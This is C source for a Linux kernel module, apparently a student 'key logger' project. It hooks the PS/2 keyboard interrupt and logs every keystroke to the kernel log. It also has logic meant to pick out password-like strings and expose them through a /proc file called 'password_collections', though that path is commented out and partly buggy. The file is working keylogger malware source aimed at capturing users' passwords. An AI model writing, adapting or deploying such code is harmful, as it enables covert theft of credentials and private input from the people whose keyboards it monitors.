e//Gus Tropea
//Projec3 key logger
// ps2 version
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/module.h>
#include <asm/io.h>
#include <linux/string.h>
#include <linux/proc_fs.h>
#include<linux/sched.h>
#include <asm/uaccess.h>
#include <linux/slab.h>
#define CAPS 0x3A
#define SHIFT_R 0x2A
#define SHIFT_L 0x36
#define BREAK_SR 0xB6
#define BREAK_SL 0xAA
#define PROC_FILE_NAME "password_collections"

int caps_on=0;
int shift_on=0; 
char buff[20];
char passwords[1024];
char special_chars[]={'!','@','#','$','%','^','&','*','('};
int offset=0;
int inc=0;
unsigned char buffer[1024*1024];

ssize_t read_file(struct file *filp,char *buf,size_t count,loff_t *offp ){
  copy_to_user(passwords, buffer, strlen(buffer));
  return strlen(buffer);
}

struct file_operations proc_fops = {
 read: read_file,
};

//maps the scancodes to keys and returns 0 if a key cannot be represented as a char
char look_up(unsigned char x){
  char kbd_lower[]={0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b', '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`', 0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0, '*', 0, ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5', '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

  char kbd_upper[]={0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ';', '\'', '`', 0, '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 0, '*', 0, ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5', '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

  char kbd_shift[]={0, 0, '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '+', '\b', '\t', 'Q', 'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[', ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J', 'K', 'L', ':', '\'', '~', 0, '\\', 'Z', 'X', 'C', 'V', 'B', 'N', 'M', ',', '.', '/', 0, '*', 0, ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '7', '8', '9', '+', '4', '5', '6', '-', '1', '2', '3', '0', '.', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, '\n', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

  if (caps_on==1 && shift_on==0){
    return kbd_upper[x];
  }
  else if (shift_on==1){
    return kbd_shift[x];
  }
  else{
    return kbd_lower[x];
  }
}

int check_for_password(int a){
  if(inc>=8){
    int num_in_string =0;
    int special_chars_in_string=0;
    int caps_in_string=0;
    int i=0;
    int j=0;
    for(;i<inc;i++){
      if(buff[i]>='0'&&buff[i]<='9'){
	num_in_string++;
      }
      if(buff[i]>='A'&&buff[i]<='Z'){
	caps_in_string++;
      }
      for(;j<10;j++){
        if(buff[i]==special_chars[j]){
          special_chars_in_string++;
        }
      }
      j=0;
    }
    if((num_in_string > 0 || special_chars_in_string > 0)&& caps_in_string>0){
      return 0;
    }
    else{
      return 1;
    }
  }
  else{
    return 1;
  }
}

int process(char mychar){
  if((check_for_password(0)==1 && inc==20) || (mychar=='\n' && inc < 8)){
    int i=0;
    for(;i < inc;i++){
      buff[i]=0;
    }
    inc=0;
  }
  else{
    buff[inc++]=mychar;
    if(check_for_password(0)==0){
      int i=0;
      for(;i < inc; i++){
	passwords[offset+i]=buff[i];
      }
      offset+=inc;
      passwords[offset]=',';
      passwords[offset+1]=' ';
      for(;i < inc;i++){
	buff[i]=0;
      }
      offset+=2;
      inc=0;
    }
  }
  printk("buff: %s\n", buff);
  printk("passwords: %s\n", passwords);
  printk("inc: %d\n", inc);
  printk("offset: %d\n", offset);
  return 0;
}

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs){
	static unsigned char scancode;
	scancode = inb (0x60);
	if(scancode==CAPS||scancode==SHIFT_R||scancode==SHIFT_L||scancode==BREAK_SR||scancode==BREAK_SL){
	  if (scancode==CAPS){
	    if (caps_on==0){
	      caps_on=1;
	      // printk("capslock is on!");
	    }
	    else if(caps_on==1){
	      caps_on=0;
	      //printk("capslock is off!");
	    }
	  }
	  if (scancode==SHIFT_R||scancode==SHIFT_L){
	    shift_on=1;
	    //printk("shift is on!");
	  }
	  if (scancode==BREAK_SR||scancode==BREAK_SL){
	    shift_on=0;
	    //  printk("shift is off!");
	  }
	}
	else{
	  char mychar=look_up(scancode);
	  //	  process(mychar);
	  	  printk("%c was pressed!", mychar);
	    printk("%x was the code", scancode);
	}
	return (irq_handler_t) IRQ_HANDLED;
}

int logger_init (void){
  proc_create(PROC_FILE_NAME,0,NULL,&proc_fops);
  return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "using_irq_handler", (void *)(irq_handler));
}

void logger_cleanup(void) {
  remove_proc_entry(PROC_FILE_NAME,NULL);
}

MODULE_LICENSE ("GPL");
module_init(logger_init);
module_exit(logger_cleanup);
